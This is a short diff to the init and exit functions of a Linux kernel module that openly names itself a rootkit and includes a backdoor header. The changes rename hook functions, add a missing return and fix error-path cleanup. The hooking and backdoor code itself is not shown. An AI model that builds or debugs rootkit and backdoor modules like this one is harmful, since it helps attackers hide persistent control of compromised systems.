@@ -13,6 +13,7 @@
 #include "backdoor.h"
 #include "proc.h"
 
+
 //insmod
 static int lkm_init(void){
     printk("ROOTKIT: Starting Rootkit ---------------------------------\n");
@@ -23,7 +24,7 @@ static int lkm_init(void){
         }
     }
 
-    if (hooks() == -1){
+    if (hooks_init() == -1){
         printk(KERN_INFO "ROOTKIT: ERROR HOOKS\n");
         goto err_hooks;
     }
@@ -33,8 +34,10 @@ static int lkm_init(void){
         goto err_proc;
     }
 
+	return 0;
+
     err_proc:
-    proc_exit();
+    hooks_exit();
 
     err_hooks:
     backdoor_exit();
@@ -46,7 +49,7 @@ static int lkm_init(void){
 static void lkm_exit(void){
     printk("ROOTKIT: Finishing Rootkit ---------------------------------\n\n");
     proc_exit();
-    hooks_stop();
+    hooks_exit();
 	if (BACKDOOR) backdoor_exit();
 }
 
